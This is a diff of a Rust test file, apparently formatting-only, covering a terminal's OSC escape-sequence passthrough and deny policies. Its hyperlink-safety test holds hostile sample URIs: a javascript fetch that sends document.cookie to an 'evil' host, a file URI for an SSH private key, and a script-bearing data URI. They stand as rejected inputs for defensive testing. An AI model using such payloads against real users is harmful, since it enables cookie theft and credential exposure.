@@ -101,7 +101,11 @@ fn osc_52_clipboard_write_is_re_emitted() {
 fn osc_2_window_title_is_re_emitted_and_captured() {
     let mut session = test_session_with_policy(OscPolicy::default());
     session.feed_pty(b"\x1b]2;Claude (working)\x07");
-    assert_eq!(session.title(), Some("Claude (working)"), "title not captured");
+    assert_eq!(
+        session.title(),
+        Some("Claude (working)"),
+        "title not captured"
+    );
     let drained = session.drain_passthrough();
     assert_eq!(drained.len(), 1);
     assert!(drained[0].starts_with(b"\x1b]0;") || drained[0].starts_with(b"\x1b]2;"));
@@ -111,7 +115,9 @@ fn osc_2_window_title_is_re_emitted_and_captured() {
 fn osc_8_hyperlink_is_re_emitted() {
     let drained = drained(b"\x1b]8;;https://example/\x07text\x1b]8;;\x07");
     assert!(
-        drained.iter().any(|f| f.windows(b"https".len()).any(|w| w == b"https")),
+        drained
+            .iter()
+            .any(|f| f.windows(b"https".len()).any(|w| w == b"https")),
         "expected the http hyperlink to round-trip: {drained:?}"
     );
 }
@@ -227,19 +233,28 @@ fn drain_returns_empty_when_no_passthrough_emitted() {
 #[test]
 fn osc_52_clipboard_dropped_when_policy_denies() {
     let drained = drained_with_policy(b"\x1b]52;c;SGVsbG8=\x07", OscPolicy::for_test_deny_all());
-    assert!(drained.is_empty(), "OSC 52 leaked under deny policy: {drained:?}");
+    assert!(
+        drained.is_empty(),
+        "OSC 52 leaked under deny policy: {drained:?}"
+    );
 }
 
 #[test]
 fn osc_9_notification_dropped_when_policy_denies() {
     let drained = drained_with_policy(b"\x1b]9;build finished\x07", OscPolicy::for_test_deny_all());
-    assert!(drained.is_empty(), "OSC 9 leaked under deny policy: {drained:?}");
+    assert!(
+        drained.is_empty(),
+        "OSC 9 leaked under deny policy: {drained:?}"
+    );
 }
 
 #[test]
 fn osc_2_title_dropped_when_policy_denies() {
     let drained = drained_with_policy(b"\x1b]2;rogue title\x07", OscPolicy::for_test_deny_all());
-    assert!(drained.is_empty(), "OSC 2 leaked under deny policy: {drained:?}");
+    assert!(
+        drained.is_empty(),
+        "OSC 2 leaked under deny policy: {drained:?}"
+    );
 }
 
 #[test]
@@ -248,7 +263,10 @@ fn osc_8_hyperlink_dropped_when_policy_denies() {
         b"\x1b]8;;https://example/\x07text\x1b]8;;\x07",
         OscPolicy::for_test_deny_all(),
     );
-    assert!(drained.is_empty(), "OSC 8 leaked under deny policy: {drained:?}");
+    assert!(
+        drained.is_empty(),
+        "OSC 8 leaked under deny policy: {drained:?}"
+    );
 }
 
 #[test]
@@ -257,7 +275,9 @@ fn osc_8_unsafe_scheme_dropped_even_when_policy_allows() {
     // the operator's hyperlink policy.
     let drained = drained(b"\x1b]8;;javascript:alert(1)\x07");
     assert!(
-        drained.iter().all(|f| !f.windows(b"javascript".len()).any(|w| w == b"javascript")),
+        drained
+            .iter()
+            .all(|f| !f.windows(b"javascript".len()).any(|w| w == b"javascript")),
         "unsafe OSC 8 scheme leaked: {drained:?}"
     );
 }
@@ -269,7 +289,10 @@ fn drain_clears_pending_between_calls() {
     let first = session.drain_passthrough();
     assert_eq!(first.len(), 1);
     let second = session.drain_passthrough();
-    assert!(second.is_empty(), "drain must clear pending; got {second:?}");
+    assert!(
+        second.is_empty(),
+        "drain must clear pending; got {second:?}"
+    );
 }
 
 #[test]
@@ -448,7 +471,9 @@ fn osc8_uri_unsafe_schemes_rejected() {
         "javascript:fetch('//evil/?'+document.cookie)"
     ));
     assert!(!osc8_uri_is_safe("file:///Users/operator/.ssh/id_rsa"));
-    assert!(!osc8_uri_is_safe("data:text/html,<script>alert(1)</script>"));
+    assert!(!osc8_uri_is_safe(
+        "data:text/html,<script>alert(1)</script>"
+    ));
     assert!(!osc8_uri_is_safe("ssh://server"));
 }
 
